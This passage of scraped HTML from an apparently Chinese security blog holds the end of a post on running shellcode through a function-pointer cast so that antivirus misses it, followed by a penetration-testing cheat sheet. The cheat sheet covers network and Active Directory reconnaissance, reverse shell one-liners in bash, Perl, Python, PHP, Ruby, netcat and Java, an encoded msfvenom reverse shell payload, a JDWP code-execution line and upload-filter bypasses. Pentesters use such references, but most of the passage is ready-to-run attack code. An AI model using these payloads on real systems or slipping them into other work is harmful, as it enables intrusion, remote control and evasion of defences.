class="string">&quot;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63&quot;</span></span><br><span class="line"><span class="string">&quot;\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6&quot;</span></span><br><span class="line"><span class="string">&quot;\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13&quot;</span></span><br><span class="line"><span class="string">&quot;\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (*(<span class="built_in">void</span>(*)())(&amp;goodcode))();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这种Shellcode的加载方式可以在编译时将Shellcode完全分配到<code>.text</code>段。此外将包含Shellcode的数组转换为函数指针并调用，从而避免了调用<code>CreateThread</code>之类的常用于跳转至Shellcode的Windows API。</p>
<p>这种方式可以有效避开一些杀毒软件的查杀。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/" data-id="clllrw16j000v98y50p7ify0h" data-title="避开Windows API执行Shellcode" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag">后渗透</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-渗透测试速查表" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/" class="article-date">
  <time class="dt-published" datetime="2020-11-08T04:52:24.000Z" itemprop="datePublished">2020-11-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/">渗透测试速查表</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><h3 id="存活IP扫描"><a href="#存活IP扫描" class="headerlink" title="存活IP扫描"></a>存活IP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips</span><br></pre></td></tr></table></figure>
<h3 id="批量Ping"><a href="#批量Ping" class="headerlink" title="批量Ping"></a>批量Ping</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for lastOctet in &#123;1..254&#125;; do </span><br><span class="line">    ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h3 id="单个端口检查"><a href="#单个端口检查" class="headerlink" title="单个端口检查"></a>单个端口检查</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -v $TARGET 80</span><br><span class="line">telnet $TARGET 80</span><br><span class="line">curl -vX $TARGET</span><br></pre></td></tr></table></figure>
<h3 id="少量端口探测"><a href="#少量端口探测" class="headerlink" title="少量端口探测"></a>少量端口探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done</span><br></pre></td></tr></table></figure>
<h3 id="nc端口扫描"><a href="#nc端口扫描" class="headerlink" title="nc端口扫描"></a>nc端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv -w 1 -z host 1000-2000</span><br><span class="line">nc -nv -u -z -w 1 host 160-162</span><br></pre></td></tr></table></figure>
<h3 id="Masscan端口扫描"><a href="#Masscan端口扫描" class="headerlink" title="Masscan端口扫描"></a>Masscan端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0</span><br></pre></td></tr></table></figure>
<h3 id="DNS信息查询-子域名爆破"><a href="#DNS信息查询-子域名爆破" class="headerlink" title="DNS信息查询&#x2F;子域名爆破"></a>DNS信息查询&#x2F;子域名爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whois domain.com</span><br><span class="line">dig &#123;a|txt|ns|mx&#125; domain.com</span><br><span class="line">dig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.com</span><br><span class="line">host -t &#123;a|txt|ns|mx&#125; megacorpone.com</span><br><span class="line">host -a megacorpone.com</span><br><span class="line">host -l megacorpone.com ns1.megacorpone.com</span><br><span class="line">dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com</span><br><span class="line">dnsenum domain.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d domain.com</span><br><span class="line">for sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done</span><br></pre></td></tr></table></figure>
<h3 id="NFS-Exported-Shares"><a href="#NFS-Exported-Shares" class="headerlink" title="NFS Exported Shares"></a>NFS Exported Shares</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出NFS共享，如果存在<span class="string">&#x27;rw,no_root_squash&#x27;</span>，可上传并执行sid-shell</span></span><br><span class="line">showmount -e 192.168.110.102</span><br><span class="line">chown root:root sid-shell; chmod +s sid-shell</span><br></pre></td></tr></table></figure>
<h3 id="Kerberos枚举"><a href="#Kerberos枚举" class="headerlink" title="Kerberos枚举"></a>Kerberos枚举</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">users</span></span></span><br><span class="line">nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#x27;test&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="Web漏洞扫描（简易）"><a href="#Web漏洞扫描（简易）" class="headerlink" title="Web漏洞扫描（简易）"></a>Web漏洞扫描（简易）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster</span><br><span class="line">target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto</span><br><span class="line">target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum</span><br></pre></td></tr></table></figure>
<h3 id="RPC-NetBios-SMB探测"><a href="#RPC-NetBios-SMB探测" class="headerlink" title="RPC&#x2F;NetBios&#x2F;SMB探测"></a>RPC&#x2F;NetBios&#x2F;SMB探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rpcinfo -p $TARGET</span><br><span class="line">nbtscan $TARGET</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">list shares</span></span><br><span class="line">smbclient -L //$TARGET -U &quot;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">null session</span></span><br><span class="line">rpcclient -U &quot;&quot; $TARGET</span><br><span class="line">smbclient -L //$TARGET</span><br><span class="line">enum4linux $TARGET</span><br></pre></td></tr></table></figure>
<h3 id="SNMP探测"><a href="#SNMP探测" class="headerlink" title="SNMP探测"></a>SNMP探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows User Accounts</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Running Programs</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Hostname</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Share Information</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Share Information</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows TCP Ports</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Software Name</span></span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">brute-force community strings</span></span><br><span class="line">onesixtyone -i snmp-ips.txt -c community.txt</span><br><span class="line"></span><br><span class="line">snmp-check $TARGET</span><br></pre></td></tr></table></figure>
<h3 id="SMTP探测"><a href="#SMTP探测" class="headerlink" title="SMTP探测"></a>SMTP探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150</span><br></pre></td></tr></table></figure>
<h3 id="域信息探测"><a href="#域信息探测" class="headerlink" title="域信息探测"></a>域信息探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">current domain info</span></span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">domain trusts</span></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">current forest info</span></span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get forest trust relationships</span></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#x27;Forest&#x27;, &#x27;forest-of-interest.local&#x27;)))).GetAllTrustRelationships()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get DCs of a domain</span></span><br><span class="line">nltest /dclist:offense.local</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get DC <span class="keyword">for</span> currently authenticated session</span></span><br><span class="line">nltest /dsgetdc:offense.local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get domain trusts from cmd shell</span></span><br><span class="line">nltest /domain_trusts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get user info</span></span><br><span class="line">nltest /user:&quot;spotless&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get DC <span class="keyword">for</span> currently authenticated session</span></span><br><span class="line">set l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get domain name and DC the user authenticated to</span></span><br><span class="line">klist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get all logon sessions. Includes NTLM authenticated sessions</span></span><br><span class="line">klist sessions</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kerberos tickets <span class="keyword">for</span> the session</span></span><br><span class="line">klist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cached krbtgt</span></span><br><span class="line">klist tgt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span> on older Windows systems</span></span><br><span class="line">set u</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">find DFS shares with ADModule</span></span><br><span class="line">Get-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">find DFS shares with ADSI</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">s=[adsisearcher]<span class="string">&#x27;(name=*)&#x27;</span>; <span class="variable">$s</span>.SearchRoot = [adsi]<span class="string">&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;</span>; <span class="variable">$s</span>.FindAll() | % &#123;<span class="variable">$_</span>.properties.name&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">check <span class="keyword">if</span> spooler service is running on a host</span></span><br><span class="line">powershell ls &quot;\\dc01\pipe\spoolss&quot;</span><br></pre></td></tr></table></figure>
<h3 id="Powershell下的端口监听"><a href="#Powershell下的端口监听" class="headerlink" title="Powershell下的端口监听"></a>Powershell下的端口监听</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start listener on port 443</span></span><br><span class="line"><span class="variable">$listener</span> = [<span class="type">System.Net.Sockets.TcpListener</span>]<span class="number">443</span>; <span class="variable">$listener</span>.Start();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$client</span> = <span class="variable">$listener</span>.AcceptTcpClient();</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="variable">$client</span>.client.RemoteEndPoint <span class="string">&quot;connected!&quot;</span>;</span><br><span class="line">    <span class="variable">$client</span>.Close();</span><br><span class="line">    <span class="built_in">start-sleep</span> <span class="literal">-seconds</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">URL-Encoded Perl: Linux</span></span><br><span class="line"><span class="meta prompt_">echo%</span><span class="language-bash">20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</span></span><br></pre></td></tr></table></figure>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="Netcat-without-e"><a href="#Netcat-without-e" class="headerlink" title="Netcat without -e"></a>Netcat without -e</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1</span></span><br><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2</span></span><br><span class="line">nc localhost 443 | /bin/sh | nc localhost 444</span><br></pre></td></tr></table></figure>
<h3 id="Telnet-Linux"><a href="#Telnet-Linux" class="headerlink" title="Telnet(Linux)"></a>Telnet(Linux)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet localhost 443 | /bin/sh | telnet localhost 444</span><br></pre></td></tr></table></figure>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();</span><br></pre></td></tr></table></figure>
<h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br></pre></td></tr></table></figure>
<h3 id="非交互式shell升级"><a href="#非交互式shell升级" class="headerlink" title="非交互式shell升级"></a>非交互式shell升级</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">/bin/busybox sh</span><br></pre></td></tr></table></figure>
<p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p>
<h2 id="JDWP-RCE"><a href="#JDWP-RCE" class="headerlink" title="JDWP RCE"></a>JDWP RCE</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())</span><br></pre></td></tr></table></figure>
<p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p>
<h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><h3 id="msf生成有效载荷"><a href="#msf生成有效载荷" class="headerlink" title="msf生成有效载荷"></a>msf生成有效载荷</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai</span><br></pre></td></tr></table></figure>
<h3 id="Linux下编译c代码"><a href="#Linux下编译c代码" class="headerlink" title="Linux下编译c代码"></a>Linux下编译c代码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows</span></span><br><span class="line">i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux</span></span><br><span class="line">gcc -m32|-m64 -o output source.c</span><br></pre></td></tr></table></figure>
<h3 id="Windows下编译为-obj"><a href="#Windows下编译为-obj" class="headerlink" title="Windows下编译为.obj"></a>Windows下编译为.obj</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D</span></span><br><span class="line">nasm -f win64 .\hello.asm -o .\hello.obj</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://www.godevtool.com/Golink.zip</span></span><br><span class="line">GoLink.exe -o .\hello.exe .\hello.obj</span><br></pre></td></tr></table></figure>
<h3 id="py文件转换exe"><a href="#py文件转换exe" class="headerlink" title="py文件转换exe"></a>py文件转换exe</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller.py --onefile convert-to-exe.py</span><br></pre></td></tr></table></figure>
<h3 id="生成有效载荷模式并计算偏移量"><a href="#生成有效载荷模式并计算偏移量" class="headerlink" title="生成有效载荷模式并计算偏移量"></a>生成有效载荷模式并计算偏移量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE</span><br></pre></td></tr></table></figure>

<h2 id="WEB文件上传"><a href="#WEB文件上传" class="headerlink" title="WEB文件上传"></a>WEB文件上传</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file.php -&gt; file.jpg</span><br><span class="line">file.php -&gt; file.php.jpg</span><br><span class="line">file.asp -&gt; file.asp;.jpg</span><br><span class="line">file.gif (contains php code, but starts with string GIF/GIF98)</span><br><span class="line">00%</span><br><span class="line">file.jpg with php backdoor in exif (see below)</span><br><span class="line">.jpg -&gt; proxy intercept -&gt; rename to .php</span><br></pre></td></tr></table></figure>

